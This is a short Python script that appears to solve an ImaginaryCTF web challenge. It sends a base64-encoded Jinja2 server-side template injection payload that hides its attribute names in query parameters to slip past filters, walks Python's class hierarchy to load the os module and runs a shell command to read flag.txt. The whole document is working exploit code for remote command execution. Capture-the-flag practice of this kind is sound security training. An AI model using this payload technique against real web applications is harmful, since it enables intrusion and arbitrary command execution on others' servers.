import requests
from base64 import b64encode
import html

params = {
    "a" : "__class__", 
    "b" : "__subclasses__", 
    "content" : b64encode(b"{{config[request.args.a].mro()[1][request.args.b]()[84].load_module('os').popen('cat flag.txt').read()}}")
}
r = requests.get("https://build-a-website.chal.imaginaryctf.org/site", params=params)
print(r.text)
